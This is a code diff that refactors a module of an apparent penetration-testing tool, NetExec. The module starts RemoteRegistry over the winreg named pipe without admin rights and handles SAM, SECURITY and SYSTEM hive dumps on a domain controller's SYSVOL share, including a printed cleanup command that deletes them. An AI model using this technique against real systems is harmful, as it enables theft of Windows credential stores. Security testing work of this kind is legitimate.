@@ -1,4 +1,3 @@
-import time
 import os
 import datetime
 
@@ -30,7 +29,7 @@ class NXCModule:
         connection.args.share = "SYSVOL"
         # enable remote registry
         context.log.display("Triggering RemoteRegistry to start through named pipe...")
-        self.trigger_winreg(connection.conn, context)
+        connection.trigger_winreg()
         rpc = transport.DCERPCTransportFactory(r"ncacn_np:445[\pipe\winreg]")
         rpc.set_smb_connection(connection.conn)
         if connection.kerberos:
@@ -115,29 +114,3 @@ class NXCModule:
             context.log.display("netexec smb dc_ip -u user -p pass -x \"del C:\\Windows\\sysvol\\sysvol\\SECURITY && del C:\\Windows\\sysvol\\sysvol\\SAM && del C:\\Windows\\sysvol\\sysvol\\SYSTEM\"")  # noqa: Q003
         else:
             context.log.display("Successfully deleted dump files !")
-
-    def trigger_winreg(self, connection, context):
-        # Original idea from https://twitter.com/splinter_code/status/1715876413474025704
-        # Basically triggers the RemoteRegistry to start without admin privs
-        tid = connection.connectTree("IPC$")
-        try:
-            connection.openFile(
-                tid,
-                r"\winreg",
-                0x12019F,
-                creationOption=0x40,
-                fileAttributes=0x80,
-            )
-        except SessionError as e:
-            # STATUS_PIPE_NOT_AVAILABLE error is expected
-            context.log.debug(str(e))
-        # Give remote registry time to start
-        time.sleep(1)
-
-    def _strip_root_key(self, dce, key_name):
-        # Let's strip the root key
-        key_name.split("\\")[0]
-        sub_key = "\\".join(key_name.split("\\")[1:])
-        ans = rrp.hOpenLocalMachine(dce)
-        h_root_key = ans["phKey"]
-        return h_root_key, sub_key
